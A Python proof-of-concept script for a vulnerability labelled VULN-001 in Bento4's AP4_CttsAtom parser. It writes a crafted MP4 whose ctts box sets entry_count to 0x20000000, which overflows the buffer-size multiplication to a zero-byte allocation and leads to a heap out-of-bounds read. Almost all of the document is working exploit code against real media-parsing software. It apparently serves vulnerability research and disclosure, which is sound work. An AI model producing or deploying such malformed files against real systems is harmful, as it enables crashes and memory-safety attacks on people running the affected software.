#!/usr/bin/env python3
"""
PoC generator for VULN-001: AP4_CttsAtom integer overflow + heap OOB read.

Vulnerability: Ap4CttsAtom.cpp line 80:
    unsigned char* buffer = new unsigned char[entry_count*8];
When entry_count = 0x20000000, the 32-bit product 0x20000000*8 = 0x100000000
overflows to 0, allocating a 0-byte buffer. The subsequent loop (line 88)
then performs out-of-bounds reads on that 0-byte buffer.
"""

import struct
import os

# Output path
OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.mp4")

# --- Box helpers ---

def make_box(fourcc, payload):
    """Return a standard box: 4-byte BE size + 4-byte fourcc + payload."""
    assert len(fourcc) == 4
    size = 4 + 4 + len(payload)
    return struct.pack(">I", size) + fourcc.encode("latin-1") + payload


def make_full_box(fourcc, version, flags, payload):
    """Return a FullBox: size + fourcc + version(1B) + flags(3B) + payload."""
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return make_box(fourcc, header + payload)


# --- Individual atom builders ---

def build_ftyp():
    data = b"isom" + struct.pack(">I", 0) + b"isom" + b"mp41"
    return make_box("ftyp", data)


def build_mvhd():
    # version 0 movie header
    identity_matrix = struct.pack(
        ">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    data = (
        struct.pack(">I", 0) +        # creation_time
        struct.pack(">I", 0) +        # modification_time
        struct.pack(">I", 1000) +     # timescale
        struct.pack(">I", 0) +        # duration
        struct.pack(">I", 0x00010000) +  # rate = 1.0
        struct.pack(">H", 0x0100) +   # volume = 1.0
        b"\x00" * 10 +               # reserved
        identity_matrix +            # 36 bytes
        b"\x00" * 24 +               # pre_defined (6 x 4 bytes)
        struct.pack(">I", 2)          # next_track_id
    )
    return make_full_box("mvhd", 0, 0, data)


def build_tkhd():
    # version 0 track header, flags = 3 (enabled + in movie)
    identity_matrix = struct.pack(
        ">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    data = (
        struct.pack(">I", 0) +   # creation_time
        struct.pack(">I", 0) +   # modification_time
        struct.pack(">I", 1) +   # track_id = 1
        struct.pack(">I", 0) +   # reserved
        struct.pack(">I", 0) +   # duration
        b"\x00" * 8 +            # reserved
        struct.pack(">H", 0) +   # layer
        struct.pack(">H", 0) +   # alternate_group
        struct.pack(">H", 0x0100) +  # volume
        struct.pack(">H", 0) +   # reserved
        identity_matrix +        # 36 bytes
        struct.pack(">I", 0) +   # width
        struct.pack(">I", 0)     # height
    )
    return make_full_box("tkhd", 0, 3, data)


def build_mdhd():
    # version 0 media header
    data = (
        struct.pack(">I", 0) +     # creation_time
        struct.pack(">I", 0) +     # modification_time
        struct.pack(">I", 44100) + # timescale (audio sample rate)
        struct.pack(">I", 0) +     # duration
        struct.pack(">H", 0x55C4) +  # language = 'und'
        struct.pack(">H", 0)       # pre_defined
    )
    return make_full_box("mdhd", 0, 0, data)


def build_hdlr():
    # handler for audio track
    data = (
        struct.pack(">I", 0) +   # pre_defined
        b"soun" +                # handler_type
        b"\x00" * 12 +          # reserved (3 x 4 bytes)
        b"\x00"                  # null-terminated name (empty)
    )
    return make_full_box("hdlr", 0, 0, data)


def build_smhd():
    data = struct.pack(">HH", 0, 0)  # balance + reserved
    return make_full_box("smhd", 0, 0, data)


def build_dref():
    # A self-contained URL entry (flags=1 means self-contained, no URL string)
    url_entry = make_full_box("url ", 0, 1, b"")
    data = struct.pack(">I", 1) + url_entry  # entry_count = 1
    return make_full_box("dref", 0, 0, data)


def build_dinf():
    return make_box("dinf", build_dref())


def build_stsd():
    # empty sample description table
    data = struct.pack(">I", 0)  # entry_count = 0
    return make_full_box("stsd", 0, 0, data)


def build_stts():
    # empty time-to-sample table
    data = struct.pack(">I", 0)  # entry_count = 0
    return make_full_box("stts", 0, 0, data)


def build_ctts_malicious():
    """
    THE TRIGGER:
    entry_count = 0x20000000
    In C++: new unsigned char[0x20000000 * 8]
           = new unsigned char[0x100000000 & 0xFFFFFFFF]
           = new unsigned char[0]
    Then the loop reads buffer[i*8] for i in [0, 0x20000000) -> heap OOB read.
    """
    TRIGGER_COUNT = 0x20000000
    data = struct.pack(">I", TRIGGER_COUNT)
    return make_full_box("ctts", 0, 0, data)


def build_stsz():
    # empty sample size table
    data = struct.pack(">II", 0, 0)  # sample_size=0, sample_count=0
    return make_full_box("stsz", 0, 0, data)


def build_stco():
    # empty chunk offset table
    data = struct.pack(">I", 0)  # entry_count = 0
    return make_full_box("stco", 0, 0, data)


def build_stbl():
    payload = (
        build_stsd() +
        build_stts() +
        build_ctts_malicious() +  # <-- overflow trigger
        build_stsz() +
        build_stco()
    )
    return make_box("stbl", payload)


def build_minf():
    payload = build_smhd() + build_dinf() + build_stbl()
    return make_box("minf", payload)


def build_mdia():
    payload = build_mdhd() + build_hdlr() + build_minf()
    return make_box("mdia", payload)


def build_trak():
    payload = build_tkhd() + build_mdia()
    return make_box("trak", payload)


def build_moov():
    payload = build_mvhd() + build_trak()
    return make_box("moov", payload)


def build_mdat():
    return make_box("mdat", b"")


def main():
    mp4 = build_ftyp() + build_moov() + build_mdat()

    with open(OUT_FILE, "wb") as f:
        f.write(mp4)

    print(f"[+] Written {len(mp4)} bytes to {OUT_FILE}")
    print(f"[+] ctts entry_count = 0x20000000 -> new unsigned char[0] (overflow)")
    print(f"[+] Expected: ASAN heap-buffer-overflow on read in AP4_CttsAtom ctor")


if __name__ == "__main__":
    main()
